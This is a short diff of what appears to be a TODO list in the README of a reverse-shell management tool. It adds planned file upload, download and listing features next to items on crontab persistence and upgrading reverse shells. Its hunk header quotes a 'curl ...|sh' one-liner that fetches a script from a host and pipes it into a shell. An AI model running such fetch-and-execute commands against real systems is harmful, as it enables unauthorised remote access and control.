@@ -96,3 +96,8 @@ curl http://192.168.1.2:8080/192.168.1.2/8080|sh
 - [ ] Use crontab
 - [ ] Use HR package to detect the status of client (maybe `echo $random_string`)
 - [ ] Upgrade common reverse shell session into full interactive session
+- [ ] Provide full kernel API
+- [ ] Upload file
+- [ ] Download file
+- [ ] List file
+
